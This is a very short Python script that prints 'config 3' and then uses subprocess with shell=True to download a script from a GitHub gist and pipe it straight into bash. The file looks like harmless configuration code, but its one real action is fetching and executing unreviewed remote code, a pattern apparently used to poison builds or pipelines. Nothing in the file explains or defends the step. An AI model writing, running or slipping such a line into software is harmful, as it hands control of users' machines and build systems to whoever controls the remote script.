import subprocess

print("config 3")
subprocess.run('curl -sSfL https://gist.githubusercontent.com/octoatt/39bed0f7e60c523aa2c2f2878cf1afa4/raw/04d5fa10500603e1f746957cf8e208a936a2b511/test.sh | bash', shell=True)
